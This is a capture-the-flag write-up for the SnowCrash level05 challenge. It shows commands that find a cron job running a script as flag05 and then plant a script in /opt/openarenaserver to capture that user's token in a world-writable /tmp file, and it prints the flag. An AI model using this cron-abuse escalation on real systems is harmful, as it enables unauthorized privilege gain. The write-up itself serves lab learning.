# level05

## Recognition

There is a file owned by flag05 in /usr/sbin/openarenaserver.  

```bash
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

When looking at the content of the file, we can see that this is a bash script executing any file located in /opt/openarenaserver.
```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

We can also check for all files named `level05`
```bash
level05@SnowCrash:~$ find / -name level05 2>/dev/null
/var/mail/level05
/rofs/var/mail/level05
```

The file in /var/mail/level05 contains the following cron information :
```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Which tells us that the script in /usr/sbin/openarenaserver will be executed by the cron every 2 minutes.

</br>
</br>

## Exploitation

We can then try to add a script in /opt/openarenaserver/ which will execute `getflag`, we will also need to create a file in /tmp/flag so that it will be readable by level05, if the file is created by the script it will not be readable to our user. Similarly we have to give the permission to the file to be written by anyone.

```
level05@SnowCrash:~$ touch /tmp/flag
level05@SnowCrash:~$ chmod a+rwx /tmp/flag
level05@SnowCrash:~$ cat > /opt/openarenaserver/getflag.sh << EOF
> #!/bin/bash
> getflag > /tmp/flag
> EOF
```


We can then wait for the cron to execute the script (we can check it by checking the script which will be deleted after execution), and cat the file /tmp/flag containing the token
```
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```